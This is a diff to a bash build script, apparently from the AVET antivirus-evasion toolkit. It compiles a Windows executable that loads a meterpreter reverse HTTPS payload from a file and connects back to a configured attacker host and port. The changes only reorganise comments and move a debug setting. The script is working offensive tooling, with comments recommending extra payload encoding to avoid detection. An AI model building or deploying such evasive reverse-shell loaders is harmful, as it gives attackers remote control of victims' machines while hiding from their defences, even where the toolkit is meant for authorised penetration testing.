@@ -1,8 +1,10 @@
 #!/bin/bash          
-# build the .exe file that loads the payload from a given text file
 
-# Call the generated executable like:
-# output.exe thepayload.bin
+
+#DESCRIPTION_START
+# build the .exe file that loads the payload from a given text file
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -18,9 +20,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
@@ -43,9 +51,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# enable debug output
-enable_debug_print
-
 # compile to exe file
 $win32_compiler -o output/dynamicfromfile_revhttps_win32.exe source/avet.c
 strip output/dynamicfromfile_revhttps_win32.exe
@@ -56,3 +61,9 @@ cleanup_techniques
 echo "
 Call the generated executable like:
 dynamicfromfile_revhttps_win32.exe thepayload.bin"
+
+
+#USAGE_START
+# Call the generated executable like:
+# dynamicfromfile_revhttps_win32.exe thepayload.bin
+#USAGE_END
